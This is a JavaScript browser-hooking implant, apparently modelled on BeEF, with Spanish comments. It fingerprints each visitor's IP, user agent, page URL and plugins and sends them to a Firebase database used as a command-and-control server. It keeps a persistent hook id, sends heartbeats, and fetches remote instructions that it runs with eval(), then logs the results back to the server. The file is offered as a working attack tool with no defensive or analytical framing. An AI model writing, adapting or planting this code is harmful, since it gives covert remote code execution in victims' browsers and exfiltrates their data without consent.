// Configuración Firebase (usa tu URL)
const FIREBASE_CONFIG = {
  databaseURL: "https://bdbeef-fb420-default-rtdb.firebaseio.com"
};

// Inicialización
const hookId = 'hook_' + Math.random().toString(36).substr(2, 9);
let isActive = true;

// Función principal
(async function() {
  // Persistencia en localStorage
  if (!localStorage.getItem('beef_hook')) {
    localStorage.setItem('beef_hook', hookId);
  } else {
    hookId = localStorage.getItem('beef_hook');
  }

  // Registrar hook
  await registerHook();

  // Heartbeat cada 25 segundos
  setInterval(sendHeartbeat, 25000);

  // Escuchar comandos
  listenCommands();
})();

// Funciones auxiliares
async function registerHook() {
  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => data.ip);
  
  const hookData = {
    id: hookId,
    ip: ip,
    userAgent: navigator.userAgent,
    url: window.location.href,
    plugins: Array.from(navigator.plugins).map(p => p.name),
    firstSeen: new Date().toISOString(),
    lastActive: new Date().toISOString(),
    status: "active"
  };

  // Enviar a Firebase
  fetch(`${FIREBASE_CONFIG.databaseURL}/beef_hooks/${hookId}.json`, {
    method: 'PUT',
    body: JSON.stringify(hookData)
  });
}

function sendHeartbeat() {
  if (!isActive) return;
  
  const update = { 
    lastActive: new Date().toISOString(),
    status: "active"
  };
  
  fetch(`${FIREBASE_CONFIG.databaseURL}/beef_hooks/${hookId}.json`, {
    method: 'PATCH',
    body: JSON.stringify(update)
  });
}

function listenCommands() {
  const eventSource = new EventSource(`${FIREBASE_CONFIG.databaseURL}/beef_commands.json?orderBy="hookId"&equalTo="${hookId}"`);

  eventSource.onmessage = (e) => {
    const data = JSON.parse(e.data);
    if (data && data.instruction) {
      try {
        eval(data.instruction);
        logCommand(data, "executed");
      } catch (err) {
        logCommand(data, "failed", err.message);
      }
    }
  };
}

function logCommand(cmd, status, error = null) {
  const logData = {
    ...cmd,
    status: status,
    executedAt: new Date().toISOString(),
    error: error
  };
  
  fetch(`${FIREBASE_CONFIG.databaseURL}/command_logs.json`, {
    method: 'POST',
    body: JSON.stringify(logData)
  });
}

// Autodestrucción después de fecha límite
const EXPIRATION_DATE = new Date('2024-12-31');
if (new Date() > EXPIRATION_DATE) {
  isActive = false;
  localStorage.removeItem('beef_hook');
}
